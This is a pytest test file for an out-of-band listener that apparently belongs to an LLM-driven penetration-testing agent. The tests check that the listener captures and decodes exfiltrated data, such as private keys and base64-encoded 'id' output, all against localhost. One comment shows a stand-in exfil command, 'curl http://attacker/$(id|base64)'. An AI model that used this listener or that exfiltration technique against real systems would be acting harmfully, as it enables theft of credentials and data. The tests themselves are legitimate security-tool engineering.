"""OOB listener — whole-file exfil via the request body (not just URL-path)."""
import socket
import urllib.request

import tools.oob_listener as oob


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def _post(port: int, data: bytes, method: str = "POST"):
    req = urllib.request.Request(f"http://127.0.0.1:{port}/", data=data, method=method)
    urllib.request.urlopen(req, timeout=5).read()


def test_posted_body_captured_whole(monkeypatch):
    # The fix: a key/file too big for a URL is POSTed in the body and comes back
    # WHOLE under 'bodies' — the agent's "offload it another way" path actually works.
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        assert oob.oob_listener("start", interface="eth0", port=port)["status"] == "listening"
        key = "-----BEGIN PRIVATE KEY-----\n" + ("A" * 4000) + "\n-----END PRIVATE KEY-----\n"
        _post(port, key.encode())
        chk = oob.oob_listener("check")
        assert chk["callback_fired"] and chk["count"] == 1
        assert any("BEGIN PRIVATE KEY" in b and b.count("A") >= 4000 for b in chk["bodies"])
    finally:
        oob.oob_listener("stop")


def test_check_returns_raw_by_default(monkeypatch):
    # The tool never guesses: a base64 body comes back RAW unless decode is asked for.
    import base64
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        oob.oob_listener("start", interface="eth0", port=port)
        secret = "uid=0(root) gid=0(root)\n" * 50
        b64 = base64.b64encode(secret.encode()).decode()
        _post(port, b64.encode(), method="PUT")
        chk = oob.oob_listener("check")                      # no decode → raw
        assert any(b == b64 for b in chk["bodies"])          # raw base64, untouched
        assert "decoded" not in chk
    finally:
        oob.oob_listener("stop")


def test_check_decodes_when_codec_named(monkeypatch):
    # The LLM-driven path: it saw base64 in the raw and asks check(decode='base64').
    import base64
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        oob.oob_listener("start", interface="eth0", port=port)
        secret = "uid=0(root) gid=0(root)\n" * 50
        _post(port, base64.b64encode(secret.encode()), method="PUT")
        chk = oob.oob_listener("check", decode="base64")
        assert any("uid=0(root)" in d for d in chk["decoded"])
    finally:
        oob.oob_listener("stop")


def test_decode_base64_path_segment():
    # URL-path exfil: curl http://attacker/$(id|base64) → decode the last segment.
    import base64
    payload = "uid=998(nifi) gid=998(nifi) groups=998(nifi)"
    seg = base64.urlsafe_b64encode(payload.encode()).decode()
    assert oob._decode_blob(oob._last_path_segment(f"/{seg}"), "base64url") == payload


def test_decode_blob_codecs():
    import base64, gzip, urllib.parse
    assert oob._decode_blob("68656c6c6f", "hex") == "hello"
    assert oob._decode_blob("%2Fetc%2Fpasswd", "url") == "/etc/passwd"
    assert oob._decode_blob("uryyb", "rot13") == "hello"
    gz = base64.b64encode(gzip.compress(b"secret data")).decode()
    assert oob._decode_blob(gz, "gzip") == "secret data"


def test_decode_plaintext_is_explicit_not_mojibake():
    # The old bug: plain text auto-"decoded" into garbage. Now decoding only happens
    # when the LLM names a codec — and a wrong codec fails loudly instead of lying.
    # 'id' is not valid hex; decoding raises a clear error rather than emitting junk.
    import pytest
    with pytest.raises(ValueError):
        oob._decode_blob("id!!", "hex")
    # raw mode is a passthrough — the agent always has the truth available
    assert oob._decode_blob("whoami", "raw") == "whoami"


def test_check_decode_errors_surfaced(monkeypatch):
    # A wrong codec choice is reported in decode_errors, never silently mangled.
    monkeypatch.setattr(oob, "_get_interface_ip", lambda iface: "127.0.0.1")
    port = _free_port()
    try:
        oob.oob_listener("start", interface="eth0", port=port)
        _post(port, b"this is not base64 at all, just text")
        chk = oob.oob_listener("check", decode="hex")
        assert chk.get("decode_errors")
    finally:
        oob.oob_listener("stop")
